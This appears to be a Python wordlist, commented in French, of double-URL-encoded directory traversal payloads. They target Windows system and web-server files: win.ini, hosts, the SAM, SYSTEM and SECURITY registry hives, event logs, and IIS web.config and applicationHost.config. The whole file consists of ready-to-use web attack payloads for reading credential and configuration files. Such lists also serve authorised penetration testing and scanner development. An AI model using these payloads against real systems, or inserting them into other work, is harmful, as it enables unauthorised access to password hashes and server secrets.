windows_traversals_2_encoded = [
    # Configuration système de base
    "%252e%252e%255c%252e%252e%255cwindows/win.ini",                    # Fichier historique toujours présent
    "%252e%252e%255c%252e%252e%255cwindows/system.ini",                  # Vieux fichier config Windows
    "%252e%252e%255c%252e%252e%255cwindows/system32/drivers/etc/hosts",  # Fichier hosts local
    "%252e%252e%255c%252e%252e%255cwindows/system32/drivers/etc/networks",
    "%252e%252e%255c%252e%252e%255cwindows/system32/drivers/etc/protocol",
    "%252e%252e%255c%252e%252e%255cwindows/system32/drivers/etc/services",

    # SAM et registre (attention, nécessite souvent des privilèges)
    "%252e%252e%255c%252e%252e%255cwindows/system32/config/SAM",         # Comptes locaux
    "%252e%252e%255c%252e%252e%255cwindows/system32/config/SYSTEM",      # Informations système
    "%252e%252e%255c%252e%252e%255cwindows/system32/config/SECURITY",    # Infos de sécurité
    "%252e%252e%255c%252e%252e%255cwindows/system32/config/SOFTWARE",    # Logiciels installés
    "%252e%252e%255c%252e%252e%255cwindows/system32/config/DEFAULT",     # Paramètres par défaut

    # Journaux d'événements
    "%252e%252e%255c%252e%252e%255cwindows/system32/winevt/Logs/System.evtx",
    "%252e%252e%255c%252e%252e%255cwindows/system32/winevt/Logs/Security.evtx",
    "%252e%252e%255c%252e%252e%255cwindows/system32/winevt/Logs/Application.evtx",

    # Fichiers de configuration IIS (serveur web)
    "%252e%252e%255c%252e%252e%255cinetpub/logs/LogFiles/W3SVC1/u_ex230101.log",  # Exemple log IIS
    "%252e%252e%255c%252e%252e%255cinetpub/wwwroot/web.config",                    # Config du site IIS
    "%252e%252e%255c%252e%252e%255cwindows/system32/inetsrv/config/applicationHost.config"  # Config globale IIS
]